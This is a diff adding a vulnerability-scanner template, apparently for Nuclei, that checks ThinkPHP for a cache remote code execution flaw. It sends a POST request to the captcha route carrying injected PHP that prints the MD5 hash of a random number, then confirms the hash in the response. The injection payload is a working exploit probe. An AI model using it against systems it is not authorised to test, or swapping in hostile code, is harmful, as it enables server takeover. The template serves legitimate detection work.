@@ -1,0 +1,30 @@
+id: poc-local-thinkphp-tp-cache-rce
+
+info:
+  name: poc-local-thinkphp-tp-cache-rce
+  author: capiton
+  severity: critical
+  description: ""
+  reference: 
+    - https://github.com/bewhale/thinkphp_gui_tools
+  tags: thinkphp
+
+variables:
+  randInt: "{{rand_int(10000,99999)}}"
+  md5_randInt: "{{md5(randInt)}}"
+
+requests:
+  - raw:
+      - |-
+        POST /index.php?s=captcha HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        a3=%0d%0avar_dump(md5({{randInt}}));%0d%0a//
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        condition: and
+        words:
+          - "{{md5_randInt}}"
